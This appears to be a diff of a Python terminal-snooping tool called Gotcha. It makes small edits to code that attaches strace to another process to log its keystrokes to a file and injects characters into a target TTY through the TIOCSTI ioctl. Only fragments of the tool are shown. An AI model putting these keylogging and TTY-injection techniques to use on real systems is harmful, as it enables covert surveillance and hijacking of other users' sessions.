@@ -1,7 +1,7 @@
 #!/usr/bin/env python3.9
 """This
 """
-__updated__ = '2022-09-21 22:22:47'
+__updated__ = '2022-09-23 20:38:57'
 
 from subprocess import Popen, PIPE
 from threading import Thread
@@ -235,7 +235,7 @@ class Gotcha:
         """
         with Popen(
             ['strace', '-s', '16384', '-p', self.pid,
-                '-e', 'read,write', '-q', '-x'],
+                '-e', 'read,write', '-q'],
             shell=False,
             stdout=PIPE,
             stderr=PIPE
@@ -249,8 +249,8 @@ class Gotcha:
             if not os.path.isfile(self.keystrokes_file):
                 open(self.keystrokes_file, 'w').close()
 
-            with open(self.keystrokes_file, 'a') as fo:
-                fo.write(f'{time.ctime()} {self.tty} {self.pid}:\n\n')
+            with open(self.keystrokes_file, 'a') as _fo:
+                _fo.write(f'{time.ctime()} {self.tty} {self.pid}:\n\n')
 
             _fdr = ''
 
@@ -335,7 +335,7 @@ class Gotcha:
 
                 while self.working:
                     try:
-                        cmd = string_escape(sys.stdin.readline(1))
+                        cmd = sys.stdin.readline(1)
                         with open(self.tty) as _f:
                             match cmd:
                                 # Help Ctrl+H
@@ -372,9 +372,6 @@ class Gotcha:
                                     fcntl.ioctl(_f, termios.TIOCSTI, cmd)
                     except IOError:
                         pass
-                    # except Exception as _e:
-                    #     if isinstance(_e, UnicodeDecodeError):
-                    #         pass
 
             finally:
                 termios.tcsetattr(_fd, termios.TCSAFLUSH, oldterm)
@@ -420,14 +417,14 @@ class Gotcha:
 
         pchar = ''
         if isinstance(out, list) and len(out):
-            pchar = string_escape(out[0])
+            pchar = out[0]
 
         if SPECIAL_KEYS_DICT.get(pchar):
             # Replace special keys to readable values in output file
             pchar = SPECIAL_KEYS_DICT[pchar]
 
         with open(self.keystrokes_file, 'a') as _fi:
-            _fi.write(string_escape(pchar))
+            _fi.write(pchar)
 
     def write_session_file(self, output="") -> None:
         """
